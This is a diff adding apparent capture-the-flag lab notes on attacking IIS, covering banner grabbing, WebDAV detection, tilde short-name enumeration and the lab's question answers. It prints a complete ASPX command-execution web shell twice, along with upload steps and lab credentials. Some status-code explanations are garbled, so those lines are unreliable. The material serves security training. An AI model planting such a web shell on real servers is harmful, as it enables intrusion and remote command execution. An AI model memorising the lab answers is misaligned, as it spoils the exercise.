@@ -627,6 +627,156 @@ If you see IIS/6.0 in a server header on a public-facing IP, treat it as comprom
 
 IIS Architecture:
 
+![IIS Architecture](../../Images/iis_architecture.png)
+
+HTTP.sys: is a kernel-mode driver that received all HTTP traffic before any IIS process touches it. A vulnerability here, like CVE-2022-21907, runs in kernel context. A crash at that level is a Blue Screen of Death, not a graceful web server error.
+
+Application Pools : These are isolation containers. Each pool runs its own w3ap.exe process under its own windows identity, This is the account content an ASPX web shell runs under, In IIS 7.5 and later, the default identity is ApplicationPoolIdentity, a virtual account names IIS APPPOOL\<pool name>. Both ApplicationPoolIdentity and the older NETWORK SERVICE carry SeImpsonatePrivilage by default, which opens the door to Potato-style escalation attacks. 
+
+HTTP Banner Grabbing 
+
+Curl -I http://MachineIP
+
+The server header gives the IIS Version. X-Powered-By: ASP.NET confirms .NET application Hosting. X-AspNet-Version gives the .NET framework version, which can reveal additional CVE's.
+
+**WebDAV Detection with options:**
+
+Web Distributed Authoring and Versioning is an HTTP extension that adds file management verbs: PUT, DELETE, COPY, MOVE, PROPFIND and LOCK. Legtimate use cases invulde Sharepoint and web-based file editing tools. When left enabled on a directory with write and script execute permissions, it becomes a direct path to uploading an executable shell.
+
+curl -X OPTIONS http://MachineIp -sv 2>&1 | grep -E "ALLOW:|DAV:"
+
+An Allow: list that only contains only GET, HEAD, POST, and OPTIONS means WebDAV is off. When you see PUT, MOVE, and DAV: 1,2, WebDAV is enabled and you should test it for write access.
+
+
+Testing What File Types Can Be Uploaded and Executed
+
+Knowing that WebDAV is enabled is not enough. You need to know whether you can upload files and, critically, whether uploaded files are executed. The approach is straightforward: PUT a test file, then GET it and observe the response. A 200 with output means the server executed it; a 200 with your raw file content means it was served statically.
+
+Test ASPX execution with curl directly, no credentials required:
+
+root@ip-10-81-64-63:~# curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.65.134.93/webdav/test.aspx
+
+PUT aspx: 401
+
+A 401 Created on the PUT confirms no write access. A 401 on the GET with rendered output (not raw source) confirms execution.
+
+Questions: 
+
+What HTTP response header reveals the IIS version? --> Server
+What is the HTTP response code after executing the PUT request on the /webdav directory? --> 401
+
+IIS Tilde (Short File Name Enumeration)
+
+One of the most useful reconnaissance techniques against an IIS server does not involve any exploit. It exploits a quirk built into Windows itself. The IIS tilde enumeration technique leaks the names of files and directories that standard browsing and directory brute-forcing would never find. If a backup file or hidden admin directory exists on the server, this technique will surface it.
+
+The 8.3 Short Filename Problem
+
+Windows inherited the 8.3 filename format from DOS. In this format, a filename can have at most 8 characters for the name and 3 for the extension. Windows generates short 8.3 filenames alongside long filenames for every file created on NTFS volumes. This is the default on most Windows Server installations, though newer server builds and cloud images sometimes disable it. The lab target has 8.3 name creation enabled.
+
+The conversion rule is predictable:
+
+1. Take the first 6 characters of the long name
+2. Append ~1 (or ~2, ~3 if there is a collision)
+3. Keep the first 3 characters of the extension
+
+So BackupFiles becomes BACKUP~1. AdminPortal becomes ADMINI~1. users_backup.xlsx becomes USERS_~1.XLS.
+
+How this vulnerabiltiy works :
+
+When IIS receives a request with a ~ character in the path, it processes it against the 8.3 short name namespace. The critical behaviour is that IIS responds differently depending on whether the tilde path matches a real short name or not. A path that matches a real file or directory returns a different HTTP status code or response size than a path that matches nothing.
+
+This difference is small but detectable. A scanner exploits it to reconstruct full short names character by character, and from the short name you can often infer what the full resource name is.
+
+For example, if the scanner determines that /BACKUP~1/ returns a 404 with a slightly different response body than /ZZZZZZ~1/, it knows BACKUP~1 exists. The attacker now knows there is a directory whose name starts with BACKUP, and they can try to access it directly or enumerate further.
+
+This technique surfaces hidden directories and backup files that a standard wordlist brute-force would miss entirely. The long filename might be completely unguessable, while the short name is always predictable from the first 6 characters.
+
+Affected versions: This vulnerability has been known since it was first publicly disclosed in 2012 (discovered in 2010) and affects IIS 5.x through IIS 10.0, including current versions on Server 2022. Microsoft has declined to patch it. The recommended mitigation is to disable 8.3 filename creation in the Windows registry.
+
+
+Questions: 
+
+1. What character in a URL path triggers the IIS tilde enumeration response difference? --> ~
+2. What legacy Windows filename format does the tilde enumeration vulnerability exploit? (Answer Format: X.X) --> 8.3
+3. What password is stored in the file discovered through tilde enumeration? --> P@ssw0rd!123
+
+**WebDAV Exploitation: Uploading an ASPX Shell:**
+
+In Task 2, sending an unauthenticated PUT request to /webdav/ returned 401 Unauthorized. IIS WebDAV on Server 2019 requires credentials. In Task 3, tilde enumeration surfaced BackupFiles/webdav_notes.txt, which contained exactly those credentials: webdav_user:P@ssw0rd!123. Now we use them to exploit WebDAV.
+
+When a WebDAV directory has write permission and script execution enabled, uploading an ASPX file and requesting it gives you code execution, no exploit required.
+
+Three Conditions for a Successful Shell Upload
+
+Three things must all be true simultaneously:
+
+WebDAV is enabled on the target directory
+Valid credentials with Write permission on the WebDAV directory 
+Script Execute is set, IIS passes .aspx requests to the ASP.NET handler rather than serving them as static content
+
+Preparing the ASPX Shell
+
+Save the following as cmd.aspx on your AttackBox. It accepts a cmd query parameter, runs it through cmd.exe, and returns the output:
+
+<​%@ Page Language="C#" %​>
+<​% 
+  string cmd = Request.QueryString["cmd"];
+  if (!string.IsNullOrEmpty(cmd)) {
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+  }
+%​>
+
+**Uploading the Shell**
+
+IIS protects the /webdav/ directory with Windows Authentication. Anonymous users can only read (GET), but write operations (PUT, DELETE, MOVE) require a valid Windows identity. NTLM proves that identity without transmitting the plaintext password. The flag --ntlm in curl tells it to use this handshake protocol for authentication.
+
+
+Shell Code : (Educational Purpose)
+<​%@ Page Language="C#" %​>
+<​% 
+  string cmd = Request.QueryString["cmd"];
+  if (!string.IsNullOrEmpty(cmd)) {
+    var proc = new System.Diagnostics.Process();
+    proc.StartInfo.FileName = "cmd.exe";
+    proc.StartInfo.Arguments = "/c " + cmd;
+    proc.StartInfo.UseShellExecute = false;
+    proc.StartInfo.RedirectStandardOutput = true;
+    proc.Start();
+    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+  }
+%​>
+
+
+| Code                                            | Explanation                                                                                                                               |
+| ----------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
+| `string cmd = Request.QueryString["cmd"];`      | Reads the value of the `cmd` parameter from the URL query string. Example: `shell.aspx?cmd=whoami` stores `whoami` in the variable `cmd`. |
+| `if (!string.IsNullOrEmpty(cmd))`               | Checks whether the `cmd` parameter exists and is not empty before executing anything.                                                     |
+| `var proc = new System.Diagnostics.Process();`  | Creates a new Process object that can start and manage operating system processes.                                                        |
+| `proc.StartInfo.FileName = "cmd.exe";`          | Specifies that the Windows Command Prompt (`cmd.exe`) should be executed.                                                                 |
+| `proc.StartInfo.Arguments = "/c " + cmd;`       | Passes the user-supplied command to `cmd.exe`. The `/c` switch means "run the command and then exit".                                     |
+| `proc.StartInfo.UseShellExecute = false;`       | Runs the process directly instead of through the Windows shell. Required when redirecting output.                                         |
+| `proc.StartInfo.RedirectStandardOutput = true;` | Captures the output of the command so it can be read programmatically instead of being displayed in a console window.                     |
+| `proc.Start();`                                 | Starts the process and executes the command.                                                                                              |
+| `proc.StandardOutput.ReadToEnd()`               | Reads all output produced by the command until the process finishes. Returns it as a string.                                              |
+| `Response.Write("<pre>" + ... + "</pre>");`     | Sends the command output back to the browser. The `<pre>` tag preserves formatting and line breaks.                                       |
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
